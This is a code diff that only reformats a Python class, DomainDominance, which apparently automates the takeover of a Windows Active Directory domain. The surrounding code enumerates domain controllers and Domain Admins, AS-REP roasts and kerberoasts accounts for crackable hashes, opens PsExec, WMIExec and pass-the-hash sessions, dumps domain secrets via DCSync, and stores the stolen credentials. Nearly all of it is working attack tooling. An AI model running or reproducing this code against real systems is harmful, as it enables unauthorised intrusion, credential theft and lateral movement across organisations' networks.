@@ -191,9 +191,7 @@ class DomainDominance:
 
         return self._results
 
-    def enumerate_domain(
-        self, domain: str, dc_ip: str = ""
-    ) -> DomainInfo:
+    def enumerate_domain(self, domain: str, dc_ip: str = "") -> DomainInfo:
         """Enumerate the target domain topology.
 
         Args:
@@ -259,9 +257,7 @@ class DomainDominance:
 
         return stash
 
-    def escalate(
-        self, domain_info: DomainInfo, stash: CredentialStash
-    ) -> list[str]:
+    def escalate(self, domain_info: DomainInfo, stash: CredentialStash) -> list[str]:
         """Escalate privileges and move laterally through the domain.
 
         Args:
@@ -355,7 +351,9 @@ class DomainDominance:
             try:
                 result = subprocess.run(
                     ["nslookup", "-type=SRV", f"_ldap._tcp.dc._msdcs.{domain}", dns],
-                    capture_output=True, text=True, timeout=10,
+                    capture_output=True,
+                    text=True,
+                    timeout=10,
                 )
                 if "internet address" in result.stdout.lower():
                     for line in result.stdout.split("\n"):
@@ -379,7 +377,9 @@ class DomainDominance:
         try:
             result = subprocess.run(
                 ["nslookup", "-type=SRV", f"_ldap._tcp.dc._msdcs.{domain}"],
-                capture_output=True, text=True, timeout=10,
+                capture_output=True,
+                text=True,
+                timeout=10,
             )
             for line in result.stdout.split("\n"):
                 parts = line.strip().split()
@@ -404,11 +404,17 @@ class DomainDominance:
         try:
             result = subprocess.run(
                 [
-                    "ldapsearch", "-x", "-H", f"ldap://{dc_ip}",
-                    "-b", f"CN=Domain Admins,CN=Users,{base_dn}",
+                    "ldapsearch",
+                    "-x",
+                    "-H",
+                    f"ldap://{dc_ip}",
+                    "-b",
+                    f"CN=Domain Admins,CN=Users,{base_dn}",
                     "member",
                 ],
-                capture_output=True, text=True, timeout=15,
+                capture_output=True,
+                text=True,
+                timeout=15,
             )
             for line in result.stdout.split("\n"):
                 if line.startswith("member:"):
@@ -430,7 +436,9 @@ class DomainDominance:
         try:
             result = subprocess.run(
                 ["enum4linux", "-U", dc_ip],
-                capture_output=True, text=True, timeout=30,
+                capture_output=True,
+                text=True,
+                timeout=30,
             )
             for line in result.stdout.split("\n"):
                 if "[" in line and "]" in line:
@@ -444,7 +452,9 @@ class DomainDominance:
             try:
                 result = subprocess.run(
                     ["rpcclient", "-U", "", "-N", dc_ip, "-c", "enumdomusers"],
-                    capture_output=True, text=True, timeout=15,
+                    capture_output=True,
+                    text=True,
+                    timeout=15,
                 )
                 for line in result.stdout.split("\n"):
                     parts = line.strip().split("[")
@@ -469,7 +479,9 @@ class DomainDominance:
         try:
             result = subprocess.run(
                 ["enum4linux", "-M", dc_ip],
-                capture_output=True, text=True, timeout=30,
+                capture_output=True,
+                text=True,
+                timeout=30,
             )
             for line in result.stdout.split("\n"):
                 if "[" in line and "]" in line:
@@ -493,7 +505,9 @@ class DomainDominance:
         try:
             result = subprocess.run(
                 ["enum4linux", "-G", dc_ip],
-                capture_output=True, text=True, timeout=30,
+                capture_output=True,
+                text=True,
+                timeout=30,
             )
         except Exception:
             pass
@@ -514,10 +528,13 @@ class DomainDominance:
                 [
                     f"{BASE_DIR}/venv/bin/GetUserSPNs.py" if (BASE_DIR / "venv").exists() else "GetUserSPNs.py",
                     "-request",
-                    "-dc-ip", dc_ip,
+                    "-dc-ip",
+                    dc_ip,
                     "anonymous:anonymous",
                 ],
-                capture_output=True, text=True, timeout=30,
+                capture_output=True,
+                text=True,
+                timeout=30,
             )
             for line in result.stdout.split("\n"):
                 if "/" in line and "@" in line:
@@ -540,7 +557,9 @@ class DomainDominance:
         try:
             result = subprocess.run(
                 ["nltest", "/domain_trusts", "/server", dc_ip],
-                capture_output=True, text=True, timeout=15,
+                capture_output=True,
+                text=True,
+                timeout=15,
             )
             for line in result.stdout.split("\n"):
                 if line.strip():
@@ -571,19 +590,33 @@ class DomainDominance:
                 impacket_dir = BASE_DIR / "venv" / "bin"
                 getnp = impacket_dir / "GetNPUsers.py" if impacket_dir.exists() else Path("GetNPUsers.py")
                 result = subprocess.run(
-                    [str(getnp), f"{domain}/", "-usersfile", "/dev/stdin",
-                     "-dc-ip", dc, "-request", "-format", "hashcat"],
-                    input=user, capture_output=True, text=True, timeout=30,
+                    [
+                        str(getnp),
+                        f"{domain}/",
+                        "-usersfile",
+                        "/dev/stdin",
+                        "-dc-ip",
+                        dc,
+                        "-request",
+                        "-format",
+                        "hashcat",
+                    ],
+                    input=user,
+                    capture_output=True,
+                    text=True,
+                    timeout=30,
                 )
                 for line in result.stdout.split("\n"):
                     if "$krb5asrep$" in line:
                         parts = line.strip().rsplit("@", 1)
-                        hashes.append({
-                            "username": parts[1] if len(parts) > 1 else user,
-                            "hash": line.strip(),
-                            "type": "asrep",
-                            "source": "asrep_roast",
-                        })
+                        hashes.append(
+                            {
+                                "username": parts[1] if len(parts) > 1 else user,
+                                "hash": line.strip(),
+                                "type": "asrep",
+                                "source": "asrep_roast",
+                            }
+                        )
             except Exception:
                 continue
 
@@ -607,16 +640,20 @@ class DomainDominance:
             getspn = impacket_dir / "GetUserSPNs.py" if impacket_dir.exists() else Path("GetUserSPNs.py")
             result = subprocess.run(
                 [str(getspn), f"{domain}/", "-dc-ip", dc, "-request"],
-                capture_output=True, text=True, timeout=30,
+                capture_output=True,
+                text=True,
+                timeout=30,
             )
             for line in result.stdout.split("\n"):
                 if "$krb5tgs$" in line:
-                    hashes.append({
-                        "username": "unknown",
-                        "hash": line.strip(),
-                        "type": "kerberoast",
-                        "source": "kerberoasting",
-                    })
+                    hashes.append(
+                        {
+                            "username": "unknown",
+                            "hash": line.strip(),
+                            "type": "kerberoast",
+                            "source": "kerberoasting",
+                        }
+                    )
         except Exception:
             pass
 
@@ -626,9 +663,7 @@ class DomainDominance:
     # Internal — execution
     # ------------------------------------------------------------------
 
-    def _psexec_session(
-        self, target: str, domain: str, user: str, password: str
-    ) -> str:
+    def _psexec_session(self, target: str, domain: str, user: str, password: str) -> str:
         """Create a PsExec session.
 
         Args:
@@ -647,7 +682,9 @@ class DomainDominance:
             psexec = impacket_dir / "psexec.py" if impacket_dir.exists() else Path("psexec.py")
             result = subprocess.run(
                 [str(psexec), f"{domain}/{user}:{password}@{target}"],
-                capture_output=True, text=True, timeout=30,
+                capture_output=True,
+                text=True,
+                timeout=30,
             )
             if "C:\\" in result.stdout or "Windows" in result.stdout:
                 sid = str(uuid.uuid4())[:8]
@@ -657,9 +694,7 @@ class DomainDominance:
             pass
         return ""
 
-    def _wmiexec_session(
-        self, target: str, domain: str, user: str, password: str
-    ) -> str:
+    def _wmiexec_session(self, target: str, domain: str, user: str, password: str) -> str:
         """Create a WMIExec session.
 
         Args:
@@ -678,7 +713,9 @@ class DomainDominance:
             wmiexec = impacket_dir / "wmiexec.py" if impacket_dir.exists() else Path("wmiexec.py")
             result = subprocess.run(
                 [str(wmiexec), f"{domain}/{user}:{password}@{target}"],
-                capture_output=True, text=True, timeout=30,
+                capture_output=True,
+                text=True,
+                timeout=30,
             )
             if "C:\\" in result.stdout or "Windows" in result.stdout:
                 sid = str(uuid.uuid4())[:8]
@@ -688,9 +725,7 @@ class DomainDominance:
             pass
         return ""
 
-    def _pth_session(
-        self, target: str, domain: str, user: str, ntlm_hash: str
-    ) -> str:
+    def _pth_session(self, target: str, domain: str, user: str, ntlm_hash: str) -> str:
         """Create a Pass-the-Hash session.
 
         Args:
@@ -715,9 +750,12 @@ class DomainDominance:
                 [
                     str(psexec),
                     f"{domain}/{user}@{target}",
-                    "-hashes", f":{ntlm_hash_clean}",
+                    "-hashes",
+                    f":{ntlm_hash_clean}",
                 ],
-                capture_output=True, text=True, timeout=30,
+                capture_output=True,
+                text=True,
+                timeout=30,
             )
             if "C:\\" in result.stdout or "Windows" in result.stdout:
                 sid = str(uuid.uuid4())[:8]
@@ -751,7 +789,9 @@ class DomainDominance:
                         str(secretsdump),
                         f"{user}:{pw}@{dc_ip}",
                     ],
-                    capture_output=True, text=True, timeout=60,
+                    capture_output=True,
+                    text=True,
+                    timeout=60,
                 )
                 output_file = SESSIONS_DIR / f"dcsync_{dc_ip.replace('.', '_')}.txt"
                 output_file.parent.mkdir(parents=True, exist_ok=True)
@@ -767,7 +807,9 @@ class DomainDominance:
 
                 result = subprocess.run(
                     [str(secretsdump), f"{user}@{dc_ip}", "-hashes", f":{h}"],
-                    capture_output=True, text=True, timeout=60,
+                    capture_output=True,
+                    text=True,
+                    timeout=60,
                 )
                 output_file = SESSIONS_DIR / f"dcsync_hash_{dc_ip.replace('.', '_')}.txt"
                 output_file.parent.mkdir(parents=True, exist_ok=True)
@@ -804,9 +846,7 @@ class DomainDominance:
         """
         return ",".join(f"DC={part}" for part in domain.split("."))
 
-    def _save_credential(
-        self, username: str, secret: str, secret_type: str, source: str
-    ) -> None:
+    def _save_credential(self, username: str, secret: str, secret_type: str, source: str) -> None:
         """Save a discovered credential to the sessions directory.
 
         Args:
@@ -822,9 +862,7 @@ class DomainDominance:
         with cred_file.open("a") as f:
             f.write(line)
 
-    def _save_session(
-        self, session_id: str, target: str, method: str, user: str
-    ) -> None:
+    def _save_session(self, session_id: str, target: str, method: str, user: str) -> None:
         """Save session metadata.
 
         Args:
